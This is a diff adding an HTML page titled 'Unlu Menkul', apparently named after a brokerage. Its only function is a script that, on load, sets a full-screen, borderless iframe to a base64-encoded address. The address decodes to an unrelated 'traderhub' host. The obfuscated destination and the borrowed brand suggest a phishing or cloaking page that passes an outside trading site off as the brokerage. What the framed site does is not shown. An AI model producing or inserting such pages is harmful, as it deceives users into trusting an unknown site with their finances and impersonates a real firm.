@@ -1,0 +1,39 @@
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Unlu Menkul</title>
+<style>
+body {
+margin: 0;
+padding: 0;
+overflow: hidden;
+height: 100vh;
+width: 100vw;
+display: flex;
+justify-content: center;
+align-items: center;
+}
+#frame {
+width: 100vw;
+height: 100vh;
+border: none;
+display: block;
+transform-origin: top left;
+transform: scale(1);
+}
+@media (max-width: 768px) {
+#frame {
+width: 100vw;
+height: 100vh;
+}
+}
+</style>
+</head>
+<body>
+<iframe id="frame" src=""></iframe>
+<script>
+document.getElementById('frame').src = atob('aHR0cHM6Ly90cmFkZXJodWItNi5lbWVyZ2VudC5ob3N0Lw==');
+</script>
+</body>
+</html>
